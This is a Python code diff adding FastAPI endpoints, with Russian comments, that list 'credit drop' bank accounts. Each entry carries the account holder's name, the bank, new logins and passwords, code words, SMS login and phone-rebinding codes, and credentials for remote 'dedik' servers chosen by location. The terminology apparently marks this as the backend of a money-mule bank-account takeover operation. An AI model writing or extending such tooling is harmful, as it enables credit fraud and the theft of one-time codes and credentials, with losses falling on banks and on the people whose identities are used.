@@ -1413,6 +1413,144 @@ async def api_system_passwords_inbox(_: None = Depends(_auth)):
     return {"ok": True, "items": out, "count": len(out)}
 
 
+# =====================================================================
+# CREDIT (Кредитование) — параллельные эндпоинты к CRM-поставщикам
+# =====================================================================
+
+@app.get("/api/system/credit_pending_lk")
+async def api_system_credit_pending_lk(_: None = Depends(_auth)):
+    """Список ЛК кредитования в активном SMS-флоу.
+    Источник — credit_drop_lks (юристы заполняют через CRM-бота)."""
+    storage.reload_sync()
+    lks_raw = (
+        storage.list_credit_drop_lks() if hasattr(storage, "list_credit_drop_lks") else {}
+    ) or {}
+    drops_raw = (
+        storage.list_credit_drops() if hasattr(storage, "list_credit_drops") else {}
+    ) or {}
+    out = []
+    stage_order = {
+        "": 0, "ready_asked": 1, "ready_confirmed": 2,
+        "login_asked": 3, "login_received": 4,
+        "perevyaz_asked": 5, "perevyaz_received": 6, "done": 99,
+    }
+    for lkid, lk in lks_raw.items():
+        stage = (lk.get("sms_stage") or "").strip()
+        if stage == "done":
+            continue
+        drop = drops_raw.get(lk.get("credit_drop_id"), {}) if drops_raw else {}
+        manager = (lk.get("manager_username") or drop.get("manager_username") or "").lstrip("@")
+        out.append({
+            "droplk_id": lkid,
+            "credit_drop_id": lk.get("credit_drop_id"),
+            "bank": lk.get("bank") or "",
+            "fio": drop.get("fio") or "—",
+            "manager": manager,
+            "scan_count": len(drop.get("scan_file_ids") or []),
+            "value": lk.get("value") or "",
+            "new_login": lk.get("new_login") or "",
+            "new_password": lk.get("new_password") or "",
+            "new_mail": lk.get("new_mail") or "",
+            "new_number": lk.get("new_number") or "",
+            "code_word": lk.get("code_word") or "",
+            "ded_login": lk.get("ded_login") or "",
+            "ded_password": lk.get("ded_pass") or "",
+            "ded_pass": lk.get("ded_pass") or "",
+            "ded_ip": lk.get("ded_ip") or "",
+            "ded_location": lk.get("ded_location") or "",
+            "sms_stage": stage,
+            "_stage_order": stage_order.get(stage, 50),
+            "sms_login_code": lk.get("sms_login_code") or "",
+            "sms_perevyaz_code": lk.get("sms_perevyaz_code") or "",
+            "created_at": lk.get("created_at") or 0,
+            "updated_at": lk.get("updated_at") or 0,
+        })
+    # Свежие сверху (новые сообщения = новые msg_id ~ created_at)
+    out.sort(key=lambda x: -(x.get("created_at") or 0))
+    return {"ok": True, "items": out, "lks": out, "count": len(out)}
+
+
+@app.get("/api/system/credit_passwords_inbox")
+async def api_system_credit_passwords_inbox(_: None = Depends(_auth)):
+    """Inbox для КРЕДИТ | Пароли — все ЛК кредитования с заполнением credentials/дедика."""
+    storage.reload_sync()
+    lks_raw = (
+        storage.list_credit_drop_lks() if hasattr(storage, "list_credit_drop_lks") else {}
+    ) or {}
+    drops_raw = (
+        storage.list_credit_drops() if hasattr(storage, "list_credit_drops") else {}
+    ) or {}
+    out = []
+    for lkid, lk in lks_raw.items():
+        stage = (lk.get("sms_stage") or "").strip()
+        if stage not in ("perevyaz_received", "done", "login_received", "perevyaz_asked"):
+            continue
+        drop = drops_raw.get(lk.get("credit_drop_id"), {}) if drops_raw else {}
+        manager = (lk.get("manager_username") or drop.get("manager_username") or "").lstrip("@")
+        filled_creds = bool(
+            (lk.get("new_login") or "").strip() and (lk.get("new_password") or "").strip()
+        )
+        filled_dedik = bool(
+            (lk.get("ded_ip") or "").strip() and (lk.get("ded_pass") or "").strip()
+        )
+        out.append({
+            "droplk_id": lkid,
+            "credit_drop_id": lk.get("credit_drop_id"),
+            "bank": lk.get("bank") or "",
+            "fio": drop.get("fio") or "—",
+            "manager": manager,
+            "new_login": lk.get("new_login") or "",
+            "new_password": lk.get("new_password") or "",
+            "new_mail": lk.get("new_mail") or "",
+            "new_number": lk.get("new_number") or "",
+            "code_word": lk.get("code_word") or "",
+            "ded_login": lk.get("ded_login") or "Administrator",
+            "ded_password": lk.get("ded_pass") or "",
+            "ded_pass": lk.get("ded_pass") or "",
+            "ded_ip": lk.get("ded_ip") or "",
+            "ded_location": lk.get("ded_location") or "",
+            "sms_stage": stage,
+            "filled_creds": filled_creds,
+            "filled_dedik": filled_dedik,
+            "filled": filled_creds and filled_dedik,
+            "updated_at": lk.get("updated_at") or 0,
+            "created_at": lk.get("created_at") or 0,
+        })
+    out.sort(key=lambda x: -(x.get("created_at") or 0))
+    return {"ok": True, "items": out, "count": len(out)}
+
+
+@app.get("/api/system/credit_managers")
+async def api_system_credit_managers(_: None = Depends(_auth)):
+    """Список менеджеров кредитования со статистикой."""
+    storage.reload_sync()
+    mgrs = (
+        storage.list_credit_managers() if hasattr(storage, "list_credit_managers") else {}
+    ) or {}
+    chats = (
+        storage.list_credit_chats() if hasattr(storage, "list_credit_chats") else {}
+    ) or {}
+    # Считаем сколько чатов у каждого менеджера
+    chats_per_manager = {}
+    for chat_entry in chats.values():
+        u = chat_entry.get("manager_username") or ""
+        if not u:
+            continue
+        chats_per_manager[u] = chats_per_manager.get(u, 0) + 1
+    out = []
+    for u, m in mgrs.items():
+        out.append({
+            "username": u,
+            "tg_user_id": m.get("tg_user_id") or 0,
+            "first_seen_ts": m.get("first_seen_ts") or 0,
+            "last_active_ts": m.get("last_active_ts") or 0,
+            "stats": m.get("stats") or {},
+            "chats_count": chats_per_manager.get(u, 0),
+        })
+    out.sort(key=lambda x: -(x.get("last_active_ts") or 0))
+    return {"ok": True, "items": out, "count": len(out)}
+
+
 @app.post("/api/system/lk/{droplk_id}/sms_action")
 async def api_system_sms_action(droplk_id: str, request: Request, _: None = Depends(_auth)):
     """Триггерит SMS-stage переход через очередь команд CRM-боту.
